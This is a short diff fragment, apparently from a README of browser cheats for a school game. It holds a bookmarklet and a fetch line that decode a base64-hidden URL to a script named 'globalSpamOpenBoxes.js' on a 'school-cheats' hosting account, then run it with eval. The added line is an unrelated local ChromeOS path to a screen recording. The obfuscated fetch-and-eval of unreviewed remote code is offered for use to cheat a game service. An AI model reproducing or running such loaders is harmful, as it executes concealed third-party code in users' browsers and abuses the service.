@@ -18,3 +18,4 @@ javascript:fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yY
 fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vc2Nob29sLWNoZWF0cy9yYXcvdXBsb2FkL3YxNjM3NDUyMjEzL2dsb2JhbFNwYW1PcGVuQm94ZXMuanM=')).then((res) => res.text().then((t) => eval(t)))
 ```
 # cool
+file:///home/chronos/u-d21651d33cef254e544b8e9fa51b503f2b21502c/MyFiles/Downloads/Screen%20recording%202021-11-21%2012.17.01%20PM.webm
